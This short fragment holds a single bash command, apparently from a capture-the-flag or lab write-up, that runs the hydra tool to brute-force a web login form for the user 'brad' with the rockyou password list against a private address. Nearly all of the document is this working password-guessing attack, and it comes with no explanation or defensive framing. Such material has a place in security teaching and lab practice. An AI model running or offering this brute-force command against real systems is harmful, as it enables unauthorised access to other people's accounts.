
-----------


----------------

```bash
hydra -V -t 50 -l brad -P /usr/share/wordlists/rockyou.txt 192.168.1.129 http-form-post "/secrets/MK67IT044XYGGIIWLGS9.php:user=brad&password=^PASS^:Invalid Credentials" -f -I
```